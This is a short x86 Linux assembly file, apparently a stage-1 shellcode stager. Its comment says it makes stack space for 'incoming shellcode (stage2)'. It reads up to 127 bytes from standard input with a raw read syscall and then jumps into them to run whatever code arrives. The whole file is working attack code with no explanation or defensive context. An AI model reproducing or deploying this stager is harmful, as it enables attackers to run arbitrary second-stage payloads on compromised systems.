global _start

section .text
_start:
    push 0x7F
    pop	 edx	

    ; Create space for incoming shellcode (stage2)
    sub esp, 0x7F
    mov ecx, esp

    xor	ebx,ebx
    push 0x3
    pop	eax
    int	0x80
    push ecx
    ret